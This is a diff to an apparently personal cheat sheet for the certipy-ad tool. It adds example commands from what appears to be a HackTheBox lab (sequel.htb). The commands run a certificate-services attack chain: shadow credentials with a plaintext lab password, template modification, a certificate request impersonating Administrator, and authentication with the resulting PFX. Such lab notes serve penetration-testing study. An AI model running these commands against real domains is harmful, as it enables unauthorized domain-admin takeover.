@@ -4,6 +4,10 @@
 
 ## Usage
 
+### Auth
+
+Example: certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.129.251.172
+
 ### Find
 
 The find command is useful for enumerating AD CS certificate templates, certificate authorities and other configurations. The find operation searches for vulnerabilities such as missing or misconfigured certificates, insecure settings, or issues with Kerberos encryption types.
@@ -22,6 +26,12 @@ KRB5CCNAME=$PWD/<victim_username_with_TGT>.ccache certipy-ad find -scheme <schem
 
 Example: KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 10.129.251.172 -vulnerable -stdout
 
+### Req
+
+Example: certipy-ad req -u ca_svc -hashes :{ca_svc_hash} -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip {ip} -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns {ip} -dns {ip}
+
+Might need to be run multiple times to work
+
 ### Shadow Credentials
 
 ```
@@ -29,3 +39,9 @@ certipy-ad shadow auto -u <username>@<domain_name> -p '<password>' -dc-ip <domai
 ```
 
 Example : certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.129.251.172 -ns 10.129.251.172 -target dc01.sequel.htb -account ca_svc
+
+### Template
+
+This specifies the Kerberos template to use when requesting a Kerberos ticket. This template is used when performing actions like generating tickets or performing Kerberos-based attacks (like Pass-the-Ticket (PTT) or Golden Ticket).
+
+Example: KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.129.251.172
